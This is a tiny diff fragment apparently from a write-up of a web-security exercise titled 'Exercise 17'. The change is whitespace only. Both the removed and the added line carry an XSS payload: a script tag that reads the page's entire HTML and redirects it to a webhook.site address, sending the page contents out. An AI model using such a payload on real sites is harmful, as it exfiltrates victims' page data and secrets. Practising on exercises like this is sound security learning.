@@ -57,4 +57,5 @@ Exercise 17 – Take a Page Out of Their Book
     .then((data) => console.log(data));
 }
 
-send('<script> payload = document.documentElement.innerHTML; window.location="https://webhook.site/my-private-id?query=" + encodeURIComponent(payload); </script>')```
+send('<script> payload = document.documentElement.innerHTML; window.location="https://webhook.site/my-private-id?query=" + encodeURIComponent(payload); </script>') ```
+           
